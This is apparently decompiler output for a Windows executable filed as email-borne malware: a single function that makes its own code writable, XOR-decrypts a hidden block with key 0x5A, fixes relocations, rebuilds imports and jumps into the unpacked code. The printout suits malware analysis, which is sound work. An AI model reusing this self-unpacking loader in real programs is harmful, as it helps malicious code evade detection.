// subject.c
// Generated on 5/4/2015 1:01:50 AM by decompiling malware_via_email/malware_0405/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 eax, word32 ecx, word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	call SHLWAPI.dll!StrChrA (retsize: 4; depth: 32)
	word32 esi_115 = 0x00000000
	branch eax != 0x00000000 l00401026
l00401016:
	call SHLWAPI.dll!StrStrIA (retsize: 4; depth: 40)
	branch eax == 0x00000000 l0040102D
l00401026:
	return
l0040102D:
	word32 eax_68 = GetProcAddress(LoadLibraryA(0x00404084), 0x0040407C)
	call eax_68 (retsize: 4; depth: 72)
	word32 edi_404 = eax_68 + 0x0000001C
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040106C
l00401069:
	edi_404 = eax_68 + 0x0000001C ^ 0x0000000E
l0040106C:
	Mem96[fp - 0x00000048:word32] = fp - 0x00000034
	Mem98[fp - 0x0000004C:word32] = 0x00000040
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_105 = 0x00000000
l00401085:
	branch esi_115 != edi_404 l0040108B
l00401089:
	esi_115 = 0x00000000
l0040108B:
	Mem128[eax_105 + 0x00402378:byte] = Mem98[esi_115 + 0x00405000:byte] ^ Mem98[eax_105 + 0x00402378:byte] ^ 0x5A
	word32 esi_123 = esi_115 + 0x00000001
	branch esi_123 != edi_404 l004010A9
l004010A7:
	esi_123 = 0x00000000
l004010A9:
	Mem139[eax_105 + 0x00402379:byte] = Mem128[esi_123 + 0x00405000:byte] ^ Mem128[eax_105 + 0x00402379:byte] ^ 0x5A
	word32 esi_134 = esi_123 + 0x00000001
	branch esi_134 != edi_404 l004010C7
l004010C5:
	esi_134 = 0x00000000
l004010C7:
	Mem150[eax_105 + 0x0040237A:byte] = Mem139[esi_134 + 0x00405000:byte] ^ Mem139[eax_105 + 0x0040237A:byte] ^ 0x5A
	word32 esi_145 = esi_134 + 0x00000001
	branch esi_145 != edi_404 l004010E5
l004010E3:
	esi_145 = 0x00000000
l004010E5:
	Mem161[eax_105 + 0x0040237B:byte] = Mem150[esi_145 + 0x00405000:byte] ^ Mem150[eax_105 + 0x0040237B:byte] ^ 0x5A
	word32 esi_156 = esi_145 + 0x00000001
	branch esi_156 != edi_404 l00401103
l00401101:
	esi_156 = 0x00000000
l00401103:
	Mem172[eax_105 + 0x0040237C:byte] = Mem161[esi_156 + 0x00405000:byte] ^ Mem161[eax_105 + 0x0040237C:byte] ^ 0x5A
	word32 esi_167 = esi_156 + 0x00000001
	branch esi_167 != edi_404 l00401121
l0040111F:
	esi_167 = 0x00000000
l00401121:
	eax_105 = eax_105 + 0x00000006
	Mem180[eax_105 + 0x00402377:byte] = Mem172[esi_167 + 0x00405000:byte] ^ Mem172[eax_105 + 0x0040237D:byte] ^ 0x5A
	esi_115 = esi_167 + 0x00000001
	branch eax_105 <u 0x00001440 l00401085
l00401147:
	word32 esi_184 = 0x00403678
	word32 dwLoc2C_194 = 0x00000000
	word32 ecx_195 = 0x00000000
l00401170:
	word32 eax_204 = Mem180[esi_184 + 0x00000004:word32]
	word32 edx_210 = esi_184 + 0x00000008
	branch eax_204 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004011B1
l00401182:
	word32 ebx_363 = eax_204 - 0x00000008 >>u 0x00000001
l00401184:
	word32 eax_367 = (word32) Mem180[edx_210 + 0x00000000:word16]
	branch (eax_367 & 0x0000F000) != 0x00003000 l004011A5
l0040119A:
	word32 eax_381 = (eax_367 & 0x00000FFF) + Mem180[esi_184 + 0x00000000:word32]
	Mem384[eax_381 + 0x004020F8:word32] = Mem180[eax_381 + 0x004020F8:word32] + 0xF04020F8
l004011A5:
	edx_210 = edx_210 + 0x00000002
	ebx_363 = ebx_363 - 0x00000001
	branch ebx_363 != 0x00000000 l00401184
l004011AD:
	ecx_195 = dwLoc2C_194
l004011B1:
	ecx_195 = ecx_195 + Mem180[esi_184 + 0x00000004:word32]
	dwLoc2C_194 = ecx_195
	esi_184 = esi_184 + Mem180[esi_184 + 0x00000004:word32]
	branch ecx_195 <u 0x000000E8 l00401170
l004011C6:
	word32 edi_225 = 0x00402E6C
	word32 dwLoc2C_226 = 0x00402E6C
	branch Mem180[0x00402E7C:word32] == 0x00000000 l0040126B
l004011DD:
	edi_248 = edi_225
l004011E0:
	word32 edi_248
	word32 eax_257 = LoadLibraryA(Mem180[edi_248 + 0x0000000C:word32] + 0x004020F8)
	word32 ecx_259 = eax_257
	branch eax_257 == 0x00000000 l0040125A
l004011F9:
	word32 eax_284 = Mem180[edi_248 + 0x00000000:word32]
	branch eax_284 != 0x00000000 l00401202
l004011FF:
	eax_284 = Mem180[edi_248 + 0x00000010:word32]
l00401202:
	word32 ebp_289 = eax_284 + 0x004020F8
	word32 eax_292 = Mem180[ebp_289 + 0x00000000:word32]
	word32 edi_293 = Mem180[edi_248 + 0x00000010:word32] + 0x004020F8
	branch eax_292 == 0x00000000 l00401252
l00401215:
	goto l0040121B
l00401217:
	ecx_259 = eax_257
l0040121B:
	word32 eax_333
	branch eax_292 >= 0x00000000 l00401230
l0040121F:
	eax_333 = GetProcAddress(ecx_259, (word32) Mem180[ebp_289 + 0x00000000:word16])
	goto l00401243
l00401230:
	eax_333 = GetProcAddress(ecx_259, eax_292 + 0x004020FA)
l00401243:
	Mem337[edi_293 + 0x00000000:word32] = eax_333
	ebp_289 = ebp_289 + 0x00000004
	eax_292 = Mem337[ebp_289 + 0x00000000:word32]
	edi_293 = edi_293 + 0x00000004
	branch eax_292 != 0x00000000 l00401217
l00401252:
	edi_248 = dwLoc2C_226
l0040125A:
	edi_248 = edi_248 + 0x00000014
	dwLoc2C_226 = edi_248
	branch Mem180[edi_248 + 0x00000010:word32] != 0x00000000 l004011E0
l0040126B:
	call 0x00402B58 (retsize: 4; depth: 72)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

